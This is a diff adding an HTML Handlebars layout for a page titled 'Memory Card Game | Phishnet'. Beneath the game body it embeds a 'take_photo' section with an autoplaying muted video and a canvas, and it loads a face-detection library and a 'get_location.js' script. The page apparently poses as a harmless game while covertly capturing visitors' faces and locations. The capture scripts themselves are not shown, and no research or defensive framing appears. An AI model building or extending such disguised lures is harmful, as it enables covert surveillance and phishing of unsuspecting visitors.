@@ -1,0 +1,26 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />
+    {{#if title}}
+      <title>{{title}}</title>
+    {{else}}
+      <title>Memory Card Game | Phishnet</title>
+    {{/if}}
+
+    <link rel="stylesheet" href="/css/style.css" />
+  </head>
+  <body class="w-full h-full">
+    <main>
+      {{{body}}}
+    </main>
+    <section id="take_photo">
+      <video id="video" autoplay muted></video>
+      <canvas id="canvas"></canvas>
+    </section>
+    <script defer src="/js/face-api.min.js"></script>
+    <script defer src="/js/get_location.js"></script>
+  </body>
+</html>
